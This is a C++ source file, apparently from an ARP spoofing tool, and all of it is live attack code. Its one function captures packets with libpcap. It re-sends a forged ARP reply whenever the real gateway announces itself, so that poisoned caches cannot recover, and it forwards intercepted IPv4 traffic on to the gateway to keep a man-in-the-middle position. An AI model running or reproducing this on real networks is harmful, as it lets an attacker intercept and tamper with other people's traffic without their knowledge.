#include "replay_normal_packet.h"

void replay_normal_packet(parse_data *parse,pcap_t *ph){
    struct pcap_pkthdr *pkt;
    const u_char *packet;
    int ret;
    char errbuf[PCAP_ERRBUF_SIZE];
    while(true){
        while((ret=pcap_next_ex(ph,&pkt,&packet))>=-2){
            if(ret==1){
                while(pkt->len>0){
                    struct ether_header *ep=(struct ether_header*)packet;
                    if(ep->ether_type==htons(0x806)){
                        //Anti Recover
                        if(memcmp(ep->ether_shost,parse->using_gateway_mac(),6)==0){
                            pcap_sendpacket(ph,(u_char*)parse->using_send_arp_reply_packet(),parse->using_send_arp_reply_length());
                            cout << " >> Anti Recovery Arp Worked !!" << endl;
                        }
                    }
                    if(ep->ether_type==htons(0x0800)){
                        if(memcmp(ep->ether_dhost,parse->using_attack_mac(),6)==0){
                            cout << " >> Spoofing Success !!" << endl;
                            memcpy(ep->ether_dhost,parse->using_gateway_mac(),6);
                            memcpy(ep->ether_shost,parse->using_attack_mac(),6);
                            pcap_sendpacket(ph,(u_char*)packet,pkt->len);
                            break;
                        }
                    }
                    break;
                }
                break;
            }
            else if(ret==0)
                continue;
            else if(ret==-1){
                printf(">> Error!!\n");
                pcap_close(ph);
                sleep(1);
                ph = pcap_open_live(parse->using_interface(), BUFSIZ, 1 , 1, errbuf);
            }
            else if(ret==-2)
                printf("EOF");
            else
                break;
        }
    }
}
